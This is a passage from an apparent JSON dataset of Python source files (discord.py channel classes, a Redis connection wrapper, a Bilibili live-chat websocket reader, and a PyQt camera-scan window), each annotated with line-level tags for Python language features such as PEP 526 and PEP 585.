@overload\n    async def edit(self) -> None:\n        ...\n    async def edit(self, *, reason=None, **options):\n        await self._edit(options, reason=reason)\nclass CategoryChannel(discord.abc.GuildChannel, Hashable):\n    __slots__ = ('name', 'id', 'guild', 'nsfw', '_state', 'position', '_overwrites', 'category_id')\n    def __init__(self, *, state: ConnectionState, guild: Guild, data: CategoryChannelPayload):\n        self._state: ConnectionState = state\n        self.id: int = int(data['id'])\n        self._update(guild, data)\n    def __repr__(self) -> str:\n        return f'<CategoryChannel id={self.id} name={self.name!r} position={self.position} nsfw={self.nsfw}>'\n    def _update(self, guild: Guild, data: CategoryChannelPayload) -> None:\n        self.guild: Guild = guild\n        self.name: str = data['name']\n        self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')\n        self.nsfw: bool = data.get('nsfw', False)\n        self.position: int = data['position']\n        self._fill_overwrites(data)\n    @property\n    def _sorting_bucket(self) -> int:\n        return ChannelType.category.value\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.category\n    def is_nsfw(self) -> bool:\n        return self.nsfw\n    @utils.copy_doc(discord.abc.GuildChannel.clone)\n    async def clone(self, *, name: Optional[str] = None, reason: Optional[str] = None) -> CategoryChannel:\n        return await self._clone_impl({'nsfw': self.nsfw}, name=name, reason=reason)\n    @overload\n    async def edit(\n        self,\n        *,\n        name: str = ...,\n        position: int = ...,\n        nsfw: bool = ...,\n        overwrites: Mapping[Union[Role, Member], PermissionOverwrite] = ...,\n        reason: Optional[str] = ...,\n    ) -> None:\n        ...\n    @overload\n    async def edit(self) -> None:\n        ...\n    async def edit(self, *, reason=None, **options):\n        await self._edit(options=options, reason=reason)\n    @utils.copy_doc(discord.abc.GuildChannel.move)\n    async def move(self, **kwargs):\n        kwargs.pop('category', None)\n        await super().move(**kwargs)\n    @property\n    def channels(self) -> List[GuildChannelType]:\n        def comparator(channel):\n            return (not isinstance(channel, TextChannel), channel.position)\n        ret = [c for c in self.guild.channels if c.category_id == self.id]\n        ret.sort(key=comparator)\n        return ret\n    @property\n    def text_channels(self) -> List[TextChannel]:\n        ret = [c for c in self.guild.channels if c.category_id == self.id and isinstance(c, TextChannel)]\n        ret.sort(key=lambda c: (c.position, c.id))\n        return ret\n    @property\n    def voice_channels(self) -> List[VoiceChannel]:\n        ret = [c for c in self.guild.channels if c.category_id == self.id and isinstance(c, VoiceChannel)]\n        ret.sort(key=lambda c: (c.position, c.id))\n        return ret\n    @property\n    def stage_channels(self) -> List[StageChannel]:\n        ret = [c for c in self.guild.channels if c.category_id == self.id and isinstance(c, StageChannel)]\n        ret.sort(key=lambda c: (c.position, c.id))\n        return ret\n    async def create_text_channel(self, name: str, **options: Any) -> TextChannel:\n        return await self.guild.create_text_channel(name, category=self, **options)\n    async def create_voice_channel(self, name: str, **options: Any) -> VoiceChannel:\n        return await self.guild.create_voice_channel(name, category=self, **options)\n    async def create_stage_channel(self, name: str, **options: Any) -> StageChannel:\n        return await self.guild.create_stage_channel(name, category=self, **options)\nclass StoreChannel(discord.abc.GuildChannel, Hashable):\n    __slots__ = (\n        'name',\n        'id',\n        'guild',\n        '_state',\n        'nsfw',\n        'category_id',\n        'position',\n        '_overwrites',\n    )\n    def __init__(self, *, state: ConnectionState, guild: Guild, data: StoreChannelPayload):\n        self._state: ConnectionState = state\n        self.id: int = int(data['id'])\n        self._update(guild, data)\n    def __repr__(self) -> str:\n        return f'<StoreChannel id={self.id} name={self.name!r} position={self.position} nsfw={self.nsfw}>'\n    def _update(self, guild: Guild, data: StoreChannelPayload) -> None:\n        self.guild: Guild = guild\n        self.name: str = data['name']\n        self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')\n        self.position: int = data['position']\n        self.nsfw: bool = data.get('nsfw', False)\n        self._fill_overwrites(data)\n    @property\n    def _sorting_bucket(self) -> int:\n        return ChannelType.text.value\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.store\n    @utils.copy_doc(discord.abc.GuildChannel.permissions_for)\n    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:\n        base = super().permissions_for(obj)\n        denied = Permissions.voice()\n        base.value &= ~denied.value\n        return base\n    def is_nsfw(self) -> bool:\n        return self.nsfw\n    @utils.copy_doc(discord.abc.GuildChannel.clone)\n    async def clone(self, *, name: Optional[str] = None, reason: Optional[str] = None) -> StoreChannel:\n        return await self._clone_impl({'nsfw': self.nsfw}, name=name, reason=reason)\n    @overload\n    async def edit(\n        self,\n        *,\n        name: str = ...,\n        position: int = ...,\n        nsfw: bool = ...,\n        sync_permissions: bool = ...,\n        category: Optional[CategoryChannel],\n        reason: Optional[str],\n        overwrites: Mapping[Union[Role, Member], PermissionOverwrite],\n    ) -> None:\n        ...\n    @overload\n    async def edit(self) -> None:\n        ...\n    async def edit(self, *, reason=None, **options):\n        await self._edit(options, reason=reason)\nDMC = TypeVar('DMC', bound='DMChannel')\nclass DMChannel(discord.abc.Messageable, Hashable):\n    __slots__ = ('id', 'recipient', 'me', '_state')\n    def __init__(self, *, me: ClientUser, state: ConnectionState, data: DMChannelPayload):\n        self._state: ConnectionState = state\n        self.recipient: Optional[User] = state.store_user(data['recipients'][0])\n        self.me: ClientUser = me\n        self.id: int = int(data['id'])\n    async def _get_channel(self):\n        return self\n    def __str__(self) -> str:\n        if self.recipient:\n            return f'Direct Message with {self.recipient}'\n        return 'Direct Message with Unknown User'\n    def __repr__(self) -> str:\n        return f'<DMChannel id={self.id} recipient={self.recipient!r}>'\n    @classmethod\n    def _from_message(cls: Type[DMC], state: ConnectionState, channel_id: int) -> DMC:\n        self: DMC = cls.__new__(cls)\n        self._state = state\n        self.id = channel_id\n        self.recipient = None\n        self.me = state.user  \n        return self\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.private\n    @property\n    def created_at(self) -> datetime.datetime:\n        return utils.snowflake_time(self.id)\n    def permissions_for(self, obj: Any = None, /) -> Permissions:\n        base = Permissions.text()\n        base.read_messages = True\n        base.send_tts_messages = False\n        base.manage_messages = False\n        return base\n    def get_partial_message(self, message_id: int, /) -> PartialMessage:\n        from .message import PartialMessage\n        return PartialMessage(channel=self, id=message_id)\nclass GroupChannel(discord.abc.Messageable, Hashable):\n    __slots__ = ('id', 'recipients', 'owner_id', 'owner', '_icon', 'name', 'me', '_state')\n    def __init__(self, *, me: ClientUser, state: ConnectionState, data: GroupChannelPayload):\n        self._state: ConnectionState = state\n        self.id: int = int(data['id'])\n        self.me: ClientUser = me\n        self._update_group(data)\n    def _update_group(self, data: GroupChannelPayload) -> None:\n        self.owner_id: Optional[int] = utils._get_as_snowflake(data, 'owner_id')\n        self._icon: Optional[str] = data.get('icon')\n        self.name: Optional[str] = data.get('name')\n        self.recipients: List[User] = [self._state.store_user(u) for u in data.get('recipients', [])]\n        self.owner: Optional[BaseUser]\n        if self.owner_id == self.me.id:\n            self.owner = self.me\n        else:\n            self.owner = utils.find(lambda u: u.id == self.owner_id, self.recipients)\n    async def _get_channel(self):\n        return self\n    def __str__(self) -> str:\n        if self.name:\n            return self.name\n        if len(self.recipients) == 0:\n            return 'Unnamed'\n        return ', '.join(map(lambda x: x.name, self.recipients))\n    def __repr__(self) -> str:\n        return f'<GroupChannel id={self.id} name={self.name!r}>'\n    @property\n    def type(self) -> ChannelType:\n        return ChannelType.group\n    @property\n    def icon(self) -> Optional[Asset]:\n        if self._icon is None:\n            return None\n        return Asset._from_icon(self._state, self.id, self._icon, path='channel')\n    @property\n    def created_at(self) -> datetime.datetime:\n        return utils.snowflake_time(self.id)\n    def permissions_for(self, obj: Snowflake, /) -> Permissions:\n        base = Permissions.text()\n        base.read_messages = True\n        base.send_tts_messages = False\n        base.manage_messages = False\n        base.mention_everyone = True\n        if obj.id == self.owner_id:\n            base.kick_members = True\n        return base\n    async def leave(self) -> None:\n        await self._state.http.leave_group(self.id)\ndef _guild_channel_factory(channel_type: int):\n    value = try_enum(ChannelType, channel_type)\n    if value is ChannelType.text:\n        return TextChannel, value\n    elif value is ChannelType.voice:\n        return VoiceChannel, value\n    elif value is ChannelType.category:\n        return CategoryChannel, value\n    elif value is ChannelType.news:\n        return TextChannel, value\n    elif value is ChannelType.store:\n        return StoreChannel, value\n    elif value is ChannelType.stage_voice:\n        return StageChannel, value\n    else:\n        return None, value\ndef _channel_factory(channel_type: int):\n    cls, value = _guild_channel_factory(channel_type)\n    if value is ChannelType.private:\n        return DMChannel, value\n    elif value is ChannelType.group:\n        return GroupChannel, value\n    else:\n        return cls, value\ndef _threaded_channel_factory(channel_type: int):\n    cls, value = _channel_factory(channel_type)\n    if value in (ChannelType.private_thread, ChannelType.public_thread, ChannelType.news_thread):\n        return Thread, value\n    return cls, value",
            "patterns": {
                "pep_468": [
                    [
                        414,
                        "self._state.http.create_stage_instance(**payload, reason=reason)"
                    ],
                    [
                        484,
                        "super().move(**kwargs)"
                    ],
                    [
                        508,
                        "self.guild.create_text_channel(name, category=self, **options)"
                    ],
                    [
                        510,
                        "self.guild.create_voice_channel(name, category=self, **options)"
                    ],
                    [
                        512,
                        "self.guild.create_stage_channel(name, category=self, **options)"
                    ]
                ],
                "pep_526": [
                    [
                        64,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        65,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        66,
                        "self._type: int = data['type']"
                    ],
                    [
                        80,
                        "self.guild: Guild = guild"
                    ],
                    [
                        81,
                        "self.name: str = data['name']"
                    ],
                    [
                        82,
                        "self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')"
                    ],
                    [
                        83,
                        "self.topic: Optional[str] = data.get('topic')"
                    ],
                    [
                        84,
                        "self.position: int = data['position']"
                    ],
                    [
                        85,
                        "self.nsfw: bool = data.get('nsfw', False)"
                    ],
                    [
                        86,
                        "self.slowmode_delay: int = data.get('rate_limit_per_user', 0)"
                    ],
                    [
                        87,
                        "self._type: int = data.get('type', self._type)"
                    ],
                    [
                        88,
                        "self.last_message_id: Optional[int] = utils._get_as_snowflake(data, 'last_message_id')"
                    ],
                    [
                        154,
                        "message_ids: List[int] = [m.id for m in messages]"
                    ],
                    [
                        170,
                        "ret: List[Message] = []"
                    ],
                    [
                        276,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        277,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        285,
                        "self.name: str = data['name']"
                    ],
                    [
                        287,
                        "self.rtc_region: Optional[VoiceRegion] = try_enum(VoiceRegion, rtc) if rtc is not None else None"
                    ],
                    [
                        288,
                        "self.video_quality_mode: VideoQualityMode = try_enum(VideoQualityMode, data.get('video_quality_mode', 1))"
                    ],
                    [
                        289,
                        "self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')"
                    ],
                    [
                        290,
                        "self.position: int = data['position']"
                    ],
                    [
                        291,
                        "self.bitrate: int = data.get('bitrate')"
                    ],
                    [
                        292,
                        "self.user_limit: int = data.get('user_limit')"
                    ],
                    [
                        409,
                        "payload: Dict[str, Any] = {'channel_id': self.id, 'topic': topic}"
                    ],
                    [
                        442,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        443,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        448,
                        "self.guild: Guild = guild"
                    ],
                    [
                        449,
                        "self.name: str = data['name']"
                    ],
                    [
                        450,
                        "self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')"
                    ],
                    [
                        451,
                        "self.nsfw: bool = data.get('nsfw', False)"
                    ],
                    [
                        452,
                        "self.position: int = data['position']"
                    ],
                    [
                        525,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        526,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        531,
                        "self.guild: Guild = guild"
                    ],
                    [
                        532,
                        "self.name: str = data['name']"
                    ],
                    [
                        533,
                        "self.category_id: Optional[int] = utils._get_as_snowflake(data, 'parent_id')"
                    ],
                    [
                        534,
                        "self.position: int = data['position']"
                    ],
                    [
                        535,
                        "self.nsfw: bool = data.get('nsfw', False)"
                    ],
                    [
                        576,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        577,
                        "self.recipient: Optional[User] = state.store_user(data['recipients'][0])"
                    ],
                    [
                        578,
                        "self.me: ClientUser = me"
                    ],
                    [
                        579,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        590,
                        "self: DMC = cls.__new__(cls)"
                    ],
                    [
                        614,
                        "self._state: ConnectionState = state"
                    ],
                    [
                        615,
                        "self.id: int = int(data['id'])"
                    ],
                    [
                        616,
                        "self.me: ClientUser = me"
                    ],
                    [
                        619,
                        "self.owner_id: Optional[int] = utils._get_as_snowflake(data, 'owner_id')"
                    ],
                    [
                        620,
                        "self._icon: Optional[str] = data.get('icon')"
                    ],
                    [
                        621,
                        "self.name: Optional[str] = data.get('name')"
                    ],
                    [
                        622,
                        "self.recipients: List[User] = [self._state.store_user(u) for u in data.get('recipients', [])]"
                    ],
                    [
                        623,
                        "self.owner: Optional[BaseUser]"
                    ],
                    [
                        149,
                        "message_id: int = messages[0].id"
                    ]
                ],
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        1,
                        "from __future__ import annotations",
                        "import"
                    ]
                ],
                "pep_585": [
                    [
                        4,
                        "from typing import Any, Callable, Dict, Iterable, List, Mapping, Optional, TYPE_CHECKING, Tuple, Type, TypeVar, Union, overload",
                        "suggestion"
                    ],
                    [
                        4,
                        "from typing import Any, Callable, Dict, Iterable, List, Mapping, Optional, TYPE_CHECKING, Tuple, Type, TypeVar, Union, overload",
                        "suggestion"
                    ],
                    [
                        4,
                        "from typing import Any, Callable, Dict, Iterable, List, Mapping, Optional, TYPE_CHECKING, Tuple, Type, TypeVar, Union, overload",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        105,
                        "    def members(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        108,
                        "    def threads(self) -> List[Thread]:",
                        "violation"
                    ],
                    [
                        154,
                        "        message_ids: List[int] = [m.id for m in messages]",
                        "violation"
                    ],
                    [
                        170,
                        "        ret: List[Message] = []",
                        "violation"
                    ],
                    [
                        279,
                        "    def _get_voice_client_key(self) -> Tuple[int, str]:",
                        "violation"
                    ],
                    [
                        281,
                        "    def _get_voice_state_pair(self) -> Tuple[int, int]:",
                        "violation"
                    ],
                    [
                        298,
                        "    def members(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        307,
                        "    def voice_states(self) -> Dict[int, VoiceState]:",
                        "violation"
                    ],
                    [
                        383,
                        "    def requesting_to_speak(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        386,
                        "    def speakers(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        393,
                        "    def listeners(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        396,
                        "    def moderators(self) -> List[Member]:",
                        "violation"
                    ],
                    [
                        409,
                        "        payload: Dict[str, Any] = {'channel_id': self.id, 'topic': topic}",
                        "violation"
                    ],
                    [
                        486,
                        "    def channels(self) -> List[GuildChannelType]:",
                        "violation"
                    ],
                    [
                        493,
                        "    def text_channels(self) -> List[TextChannel]:",
                        "violation"
                    ],
                    [
                        498,
                        "    def voice_channels(self) -> List[VoiceChannel]:",
                        "violation"
                    ],
                    [
                        503,
                        "    def stage_channels(self) -> List[StageChannel]:",
                        "violation"
                    ],
                    [
                        622,
                        "        self.recipients: List[User] = [self._state.store_user(u) for u in data.get('recipients', [])]",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        174,
                        191,
                        "async for",
                        "async for message in iterator:\n            if count == 100:\n                to_delete = ret[-100:]\n                await strategy(to_delete)\n                count = 0\n                await asyncio.sleep(1)\n            if not check(message):\n                continue\n            if message.id < minimum_time:\n                if count == 1:\n                    await ret[-1].delete()\n                elif count >= 2:\n                    to_delete = ret[-count:]\n                    await strategy(to_delete)\n                count = 0\n                strategy = _single_delete_strategy\n            count += 1\n            ret.append(message)"
                    ]
                ],
                "pep_570": [
                    [
                        99,
                        "    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:"
                    ],
                    [
                        216,
                        "    def get_partial_message(self, message_id: int, /) -> PartialMessage:"
                    ],
                    [
                        219,
                        "    def get_thread(self, thread_id: int, /) -> Optional[Thread]:"
                    ],
                    [
                        314,
                        "    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:"
                    ],
                    [
                        544,
                        "    def permissions_for(self, obj: Union[Member, Role], /) -> Permissions:"
                    ],
                    [
                        602,
                        "    def permissions_for(self, obj: Any = None, /) -> Permissions:"
                    ],
                    [
                        608,
                        "    def get_partial_message(self, message_id: int, /) -> PartialMessage:"
                    ],
                    [
                        649,
                        "    def permissions_for(self, obj: Snowflake, /) -> Permissions:"
                    ]
                ],
                "pep_498v": [
                    [
                        77,
                        77,
                        "%"
                    ],
                    [
                        334,
                        334,
                        "%"
                    ],
                    [
                        377,
                        377,
                        "%"
                    ]
                ],
                "pep_498": [
                    [
                        78,
                        "        return f'<{self.__class__.__name__} {joined}>'"
                    ],
                    [
                        335,
                        "        return f'<{self.__class__.__name__} {joined}>'"
                    ],
                    [
                        378,
                        "        return f'<{self.__class__.__name__} {joined}>'"
                    ],
                    [
                        446,
                        "        return f'<CategoryChannel id={self.id} name={self.name!r} position={self.position} nsfw={self.nsfw}>'"
                    ],
                    [
                        529,
                        "        return f'<StoreChannel id={self.id} name={self.name!r} position={self.position} nsfw={self.nsfw}>'"
                    ],
                    [
                        587,
                        "        return f'<DMChannel id={self.id} recipient={self.recipient!r}>'"
                    ],
                    [
                        637,
                        "        return f'<GroupChannel id={self.id} name={self.name!r}>'"
                    ],
                    [
                        584,
                        "            return f'Direct Message with {self.recipient}'"
                    ],
                    [
                        212,
                        "            raise InvalidArgument(f'Expected TextChannel received {destination.__class__.__name__}')"
                    ]
                ]
            }
        },
        "54": {
            "file": "import asyncio\nimport logging\nfrom contextlib import asynccontextmanager\nfrom typing import Optional\nimport aioredis\nimport async_timeout\nfrom ..app import Application\nLOG = logging.getLogger(__name__)\nclass Redis:\n    def __init__(\n        self,\n        app: Application,\n        *args,\n        reconnection_timeoff: int = 10,\n        shutdown_timeout: int = 5,\n        **kwargs\n    ) -> None:\n        self._loop = asyncio.get_event_loop()\n        self._task: Optional[asyncio.Task] = None\n        self._result: asyncio.Future = asyncio.Future()\n        self._connection_info = (args, kwargs)\n        self._shutdown_timeout = shutdown_timeout\n        self._reconnection_timeoff = reconnection_timeoff\n        app.on_startup.append(self._startup)\n        app.on_shutdown.append(self._shutdown)\n        app.on_cleanup.append(self._cleanup)\n    async def _connect(self) -> None:\n        try:\n            pool = await aioredis.create_pool(\n                *self._connection_info[0], **self._connection_info[1]\n            )\n        except ConnectionError:\n            LOG.exception(\"Redis connection error\")\n            await asyncio.sleep(self._reconnection_timeoff)\n            self._task = self._loop.create_task(self._connect())\n        except Exception as e:\n            LOG.exception(\"Redis connection error\")\n            self._result.set_exception(e)\n        else:\n            LOG.info(\"Redis connection pool created\")\n            self._result.set_result(pool)\n    @asynccontextmanager\n    async def connection(self, timeout: int = 5) -> aioredis.RedisConnection:\n        async with async_timeout.timeout(timeout):\n            pool = await asyncio.shield(self._result)\n            try:\n                connection = await pool.acquire()\n            except ConnectionError:\n                LOG.debug(\"Connection error while acquiring connection\")\n                self._result = asyncio.Future()\n                self._task = self._loop.create_task(self._connect())\n                pool = await asyncio.shield(self._result)\n                connection = await pool.acquire()\n            try:\n                yield connection\n            finally:\n                pool.release(connection)\n    async def status(self, timeout: int = 2) -> bool:\n        try:\n            async with self.connection(timeout=timeout) as con:\n                await con.execute(\"SET\", \"xxx_STATUS\", 1)\n                await con.execute(\"DEL\", \"xxx_STATUS\", 1)\n        except asyncio.TimeoutError:\n            return False\n        except Exception:\n            LOG.exception(\"Redis failed status\")\n            return False\n        else:\n            LOG.log(4, \"Redis status OK\")\n            return True\n    async def _startup(self, app: Application) -> None:\n        LOG.debug(\"Starting Redis engine\")\n        self._task = self._loop.create_task(self._connect())\n        self._result = asyncio.Future()\n    async def _shutdown(self, app: Application) -> None:\n        LOG.debug(\"Shutting down Redis engine\")\n        if self._task and not self._task.done():\n            self._task.cancel()\n        if self._result.done():\n            pool = await self._result\n            pool.close()\n        else:\n            self._result.cancel()\n    async def _cleanup(self, app: Application) -> None:\n        LOG.debug(\"Cleaning up Redis engine\")\n        try:\n            pool = await self._result\n        except asyncio.CancelledError:\n            pass\n        else:\n            await asyncio.wait_for(pool.wait_closed(), timeout=self._shutdown_timeout)",
            "patterns": {
                "pep_526": [
                    [
                        19,
                        "self._task: Optional[asyncio.Task] = None"
                    ],
                    [
                        20,
                        "self._result: asyncio.Future = asyncio.Future()"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        43,
                        57,
                        "async generator",
                        "async def connection(self, timeout: int = 5) -> aioredis.RedisConnection:\n        async with async_timeout.timeout(timeout):\n            pool = await asyncio.shield(self._result)\n            try:\n                connection = await pool.acquire()\n            except ConnectionError:\n                LOG.debug(\"Connection error while acquiring connection\")\n                self._result = asyncio.Future()\n                self._task = self._loop.create_task(self._connect())\n                pool = await asyncio.shield(self._result)\n                connection = await pool.acquire()\n            try:\n                yield connection\n            finally:\n                pool.release(connection)"
                    ]
                ]
            }
        },
        "55": {
            "file": "import asyncio\nimport json\nimport re\nimport zlib\nfrom binascii import a2b_hex\nimport aiohttp\nimport requests\nfrom apscheduler.schedulers.asyncio import AsyncIOScheduler\nheader = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\"\n}\nbili_live_ws_url = \"https://ks-live-dmcmt-sh2-pm-01.chat.bilibili.com/sub\"\nkey_url = \"https://api.live.bilibili.com/room/v1/Danmu/getConf?room_id={}&platform=pc&player=web\"\nask_connect_num = 7  \nack_connect_num = 8  \nheartbeat_num = 2  \nask_danmu_num = 3  \nreturn_danmu_num = 5  \nheartbeat_bin = \"0000001F0010000100000002000000015B6F626A656374204F626A6563745D\"\nheartbeat_time = 0.483 * 30\nasync def bili_live_danmu(connect_data):\n    session = aiohttp.ClientSession()\n    async with session.ws_connect(bili_live_ws_url, proxy=\"http://127.0.0.1:8888\") as ws:\n        connect_data_bin = json.dumps(connect_data).encode()\n        msg_len_hex = hex(len(connect_data_bin) + 16).replace(\"0x\", \"\")\n        protocol_num_hex = f\"000000{msg_len_hex}001000010000000{ask_connect_num}00000001\"\n        protocol_bin = a2b_hex(protocol_num_hex.encode())\n        msg_bin = protocol_bin + connect_data_bin\n        print(msg_bin)\n        await ws.send_bytes(msg_bin)\n        await asyncio.sleep(0.05)\n        await heartbeat(ws)\n        scheduler.add_job(heartbeat, 'interval', seconds=heartbeat_time, args=[ws])\n        async for msg in ws:\n            if msg.data[11] == 5:\n                try:\n                    msg_data = zlib.decompress(msg.data[16:])[16:].decode(errors='ignore')\n                    if '\"cmd\":\"DANMU_MSG\"' in msg_data:\n                        result = json.loads(msg_data)\n                        danmu = {\n                            \"USER_ID\": result[\"info\"][2][0],\n                            \"USER_NAME\": result[\"info\"][2][1],\n                            \"MSG\": result[\"info\"][1],\n                        }\n                        print(danmu)\n                except:\n                    pass\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                if msg.data == 'close cmd':\n                    await ws.close()\n                    print('connection close')\n                    break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                print('websocket error to closed')\n                break\nasync def heartbeat(ws):\n    await ws.send_bytes(a2b_hex(heartbeat_bin.encode()))\ndef init(url):\n    response1 = requests.get(url, headers=header)\n    room_id = int(re.findall('\"data\":{\"room_id\":(.*?),\"', response1.text, re.S)[0])\n    response2 = requests.get(key_url.format(room_id), verify=False)\n    connect_key = response2.json()[\"data\"][\"token\"]\n    return {\"uid\": 0, \"roomid\": room_id, \"protover\": 2, \"platform\": \"web\", \"clientver\": \"1.7.5\", \"type\": 2,\n            \"key\": connect_key}\nif __name__ == '__main__':\n    room_url = \"https://live.bilibili.com/21329290?spm_id_from=333.334.b_62696c695f6c697665.12\"\n    connect_data_dict = init(room_url)\n    loop = asyncio.get_event_loop()\n    loop.create_task(bili_live_danmu(connect_data_dict))\n    scheduler = AsyncIOScheduler()\n    scheduler.start()\n    loop.run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        34,
                        55,
                        "async for",
                        "async for msg in ws:\n            if msg.data[11] == 5:\n                try:\n                    msg_data = zlib.decompress(msg.data[16:])[16:].decode(errors='ignore')\n                    if '\"cmd\":\"DANMU_MSG\"' in msg_data:\n                        result = json.loads(msg_data)\n                        danmu = {\n                            \"USER_ID\": result[\"info\"][2][0],\n                            \"USER_NAME\": result[\"info\"][2][1],\n                            \"MSG\": result[\"info\"][1],\n                        }\n                        print(danmu)\n                except:\n                    pass\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                if msg.data == 'close cmd':\n                    await ws.close()\n                    print('connection close')\n                    break\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                print('websocket error to closed')\n                break"
                    ]
                ],
                "pep_498": [
                    [
                        26,
                        "        protocol_num_hex = f\"000000{msg_len_hex}001000010000000{ask_connect_num}00000001\""
                    ]
                ]
            }
        },
        "56": {
            "file": "import asyncio\nimport subprocess\nimport time\nimport os\nimport websockets\nfrom PyQt5.QtGui import QImage, QPixmap\nfrom PyQt5.QtWidgets import QWidget, QMainWindow, QSizePolicy, QFileDialog, QMessageBox\nfrom PyQt5.QtWidgets import QHBoxLayout, QVBoxLayout\nfrom PyQt5.QtWidgets import QAction, QInputDialog, QLineEdit, QLabel, QPushButton, QSpinBox, QFormLayout\nfrom PyQt5.QtWidgets import QAbstractSpinBox\nfrom PyQt5.QtWidgets import QScrollArea, QScrollBar\nfrom PyQt5.QtCore import QEvent, Qt, QTimer, QThread, pyqtSignal, QRect\nimport numpy as np\nimport cv2\nimport datetime\nimport zipfile\nfrom PyQt5 import QtGui\nfrom vassal import Terminal\nfrom threading import Thread\nimport json\nimport xml.etree.ElementTree as Xml\nfrom imutils.video import VideoStream\nfrom scan_settings_dialog import SettingsDialog, ProgramSettings\nclass ScanWindow(QMainWindow):\n    def __init__(self, main_window):\n        super().__init__()\n        self.test = False\n        self.test_only_camera = False\n        self.main_window = main_window\n        self.loop = asyncio.get_event_loop()\n        self.program_settings = ProgramSettings(self.test)\n        self.lbl_img = QLabel(self)\n        self.scroll_area_img = QScrollArea(self)\n        self.scrollbar_img_hor = QScrollBar(Qt.Horizontal, self)\n        self.scrollbar_img_vert = QScrollBar(Qt.Vertical, self)\n        self.dir_for_img = \"SavedImg\"\n        self.path_for_xml_file = os.path.join(self.dir_for_img, \"settings.xml\")\n        if self.test:\n            self.test_img_path = os.path.join(\"TEST\", \"MotherBoard_3.jpg\")\n            self.test_img = cv2.imread(self.test_img_path)[:, :, :]\n        self.video_img = None\n        self.video_check = False\n        if not self.test:\n            max_video_streams = 5\n            video_stream_index = -1\n            check_next_stream = True\n            while check_next_stream:\n                video_stream_index += 1\n                if video_stream_index > max_video_streams:\n                    time.sleep(1.0)\n                    video_stream_index = 0\n                self.video_stream = cv2.VideoCapture(video_stream_index)\n                self.video_stream.set(3, 1920)\n                self.video_stream.set(4, 1080)\n                try:\n                    self.video_check, self.video_img = self.video_stream.read()\n                    if not self.video_check:\n                        continue\n                    check_next_stream = False\n                except Exception:\n                    check_next_stream = True\n        else:\n            self.video_stream = None\n        self.vidik = VideoStreamThread(self.video_stream, self.video_img, self)\n        if not self.test:\n            self.vidik.changePixmap.connect(self.lbl_img.setPixmap)\n            self.vidik.start()\n        self.table_controller = TableController(self.loop, self.program_settings, self.vidik, self.test)\n        if not self.test and not self.test_only_camera:\n            self.table_controller.thread_server.start()\n        time.sleep(2.0)\n        self.continuous_mode = False\n        self.closed = False\n        self.key_shift_pressed = False\n        self.keyboard_buttons = {Qt.Key_W: KeyboardButton(), Qt.Key_D: KeyboardButton(),\n                                 Qt.Key_S: KeyboardButton(), Qt.Key_A: KeyboardButton(),\n                                 Qt.Key_Plus: KeyboardButton(), Qt.Key_Minus: KeyboardButton()}\n        self.timer_continuous = QTimer()\n        self.timer_continuous.setInterval(1)\n        self.timer_continuous.timeout.connect(self.continuous_move)\n        self.unsaved = False\n        if self.test:\n            print(\"\u0412\u043d\u0438\u043c\u0430\u043d\u0438\u0435! \u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0432 \u0442\u0435\u0441\u0442\u043e\u0432\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435!\")\n        self.lbl_coord = QLabel(\"\u0422\u0435\u043a\u0443\u0449\u0438\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b:\")\n        self.btn_init = QPushButton(\"\u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\")\n        self.btn_move_work_height = QPushButton(\"\u0417\u0430\u043d\u044f\u0442\u044c \u0440\u0430\u0431\u043e\u0447\u0443\u044e \u0432\u044b\u0441\u043e\u0442\u0443\")\n        self.btn_move_mid = QPushButton(\"\u0414\u0432\u0438\u0433\u0430\u0442\u044c \u0432 \u0441\u0435\u0440\u0435\u0434\u0438\u043d\u0443\")\n        self.btn_move = QPushButton(\"\u0414\u0432\u0438\u0433\u0430\u0442\u044c \u0432 ...\")\n        self.btn_manual = QPushButton(\"\u0420\u0443\u0447\u043d\u043e\u0439 \u0440\u0435\u0436\u0438\u043c\")\n        self.edt_border_x1 = QSpinBox()\n        self.edt_border_y1 